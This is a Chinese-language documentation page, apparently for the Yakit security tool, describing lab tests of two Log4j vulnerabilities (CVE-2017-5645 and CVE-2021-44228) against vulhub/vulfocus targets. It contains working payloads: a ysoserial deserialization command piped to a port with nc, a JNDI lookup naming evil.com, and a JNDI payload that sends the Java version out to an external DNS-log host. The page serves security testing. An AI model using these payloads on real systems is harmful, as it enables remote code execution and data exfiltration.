---
sidebar_position: 28
---
# Log4j插件使用

## 1 CVE-2017-5645 反序列化命令执行漏洞

**插件id：**

Yakit正在努力编写~

**漏洞描述：**

Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。

**测试过程：**

使用vulhub靶场，在8712端口开启tcp服务

![](/img/products/yakit/Log4j-1.png)

使用ysoserial生成payload，然后直接发送给8712端口

```go
java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 "touch /tmp/success" | nc your-ip port
```

执行docker-compose exec log4j bash进入容器，可见 /tmp/success 已成功创建

![](/img/products/yakit/Log4j-3.png)

## 2 CVE-2021-44228 JNDI 注入漏洞

**插件id：**

Yakit正在努力编写~

**漏洞描述：**

Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。

**测试过程：**

访问vulfocus靶场

![](/img/products/yakit/Log4j-4.png)

开启log4j2被动扫描插件并刷新页面流量，发现在Accept参数处有漏洞

![](/img/products/yakit/Log4j-5.png)

再发送payload:${jndi:ldap://${sys:java.version}.rowkazpvsx.dnstunnel.run}，在dnslog收到命令执行结果

![](/img/products/yakit/Log4j-6.png)
